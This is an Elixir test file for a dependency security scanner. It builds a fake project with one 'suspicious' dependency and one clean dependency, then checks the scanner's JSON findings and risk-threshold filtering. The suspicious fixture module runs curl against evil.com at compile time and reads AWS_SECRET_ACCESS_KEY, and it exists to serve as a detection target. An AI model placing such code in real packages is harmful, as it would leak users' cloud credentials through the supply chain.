defmodule VetMcp.Integration.ToolExecutionTest do
  use ExUnit.Case, async: true

  alias VetMcp.Tools.GetSecurityFindings

  setup do
    tmp_dir = Path.join(System.tmp_dir!(), "vet_mcp_test_#{System.unique_integer([:positive])}")
    File.mkdir_p!(tmp_dir)

    # Create a mix.lock with two deps
    lock_content = ~s(%{\n  "suspicious_dep": {:hex, :suspicious_dep, "0.1.0", "aaa", [:mix], [], "hexpm", "bbb"},\n  "ok_dep": {:hex, :ok_dep, "1.0.0", "ccc", [:mix], [], "hexpm", "ddd"},\n})
    File.write!(Path.join(tmp_dir, "mix.lock"), lock_content)

    # Create suspicious dep with system exec
    sus_dir = Path.join([tmp_dir, "deps", "suspicious_dep", "lib"])
    File.mkdir_p!(sus_dir)

    File.write!(Path.join(sus_dir, "sus.ex"), ~S"""
    defmodule SuspiciousDep do
      @payload System.cmd("curl", ["https://evil.com"])

      def run do
        System.get_env("AWS_SECRET_ACCESS_KEY")
      end
    end
    """)

    sus_mix = Path.join([tmp_dir, "deps", "suspicious_dep"])

    File.write!(Path.join(sus_mix, "mix.exs"), ~S"""
    defmodule SuspiciousDep.MixProject do
      use Mix.Project
      def project, do: [app: :suspicious_dep, version: "0.1.0"]
    end
    """)

    # Create clean dep with no findings
    ok_dir = Path.join([tmp_dir, "deps", "ok_dep", "lib"])
    File.mkdir_p!(ok_dir)

    File.write!(Path.join(ok_dir, "ok.ex"), ~S"""
    defmodule OkDep do
      def hello, do: :ok
    end
    """)

    ok_mix = Path.join([tmp_dir, "deps", "ok_dep"])

    File.write!(Path.join(ok_mix, "mix.exs"), ~S"""
    defmodule OkDep.MixProject do
      use Mix.Project
      def project, do: [app: :ok_dep, version: "1.0.0"]
    end
    """)

    on_exit(fn -> File.rm_rf!(tmp_dir) end)
    %{project_path: tmp_dir}
  end

  describe "GetSecurityFindings.execute/2" do
    test "returns {:ok, json_string} with valid JSON", %{project_path: path} do
      assert {:ok, json_string} =
               GetSecurityFindings.execute(%{"path" => path, "skip_hex" => true}, %{})

      assert is_binary(json_string)
      assert {:ok, parsed} = Jason.decode(json_string)
      assert is_map(parsed)
      assert is_list(parsed["dependencies"])
      assert length(parsed["dependencies"]) == 2
    end

    test "threshold filter excludes low-risk deps", %{project_path: path} do
      # First, scan without threshold to get baseline
      {:ok, json_no_threshold} =
        GetSecurityFindings.execute(%{"path" => path, "skip_hex" => true, "threshold" => 0}, %{})

      {:ok, baseline} = Jason.decode(json_no_threshold)
      baseline_count = length(baseline["dependencies"])

      # Now scan with a high threshold that should exclude the clean dep
      {:ok, json_with_threshold} =
        GetSecurityFindings.execute(%{"path" => path, "skip_hex" => true, "threshold" => 1}, %{})

      {:ok, filtered} = Jason.decode(json_with_threshold)
      filtered_count = length(filtered["dependencies"])

      # ok_dep has score 0, so it should be filtered out with threshold >= 1
      assert filtered_count < baseline_count

      # Verify that only deps with score >= threshold remain
      for dep <- filtered["dependencies"] do
        assert dep["risk_score"] >= 1
      end
    end

    test "error handling: non-existent path returns error" do
      result =
        GetSecurityFindings.execute(
          %{"path" => "/nonexistent/path/to/project", "skip_hex" => true},
          %{}
        )

      assert {:error, message} = result
      assert is_binary(message)
      assert message =~ "Scan failed"
    end
  end
end
